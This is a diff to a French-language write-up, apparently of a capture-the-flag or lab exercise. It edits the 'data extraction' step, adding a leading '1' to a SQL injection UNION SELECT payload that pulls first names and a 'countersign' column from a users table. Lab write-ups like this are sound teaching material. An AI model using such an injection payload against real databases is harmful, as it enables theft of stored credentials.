@@ -56,7 +56,7 @@ via information_schema.columns → trouvé countersign
 
 ## Extraction des données
 
-```UNION SELECT first_name, countersign FROM users```
+```1 UNION SELECT first_name, countersign FROM users```
 
 ![image](Screenshots/Flag.png)
 
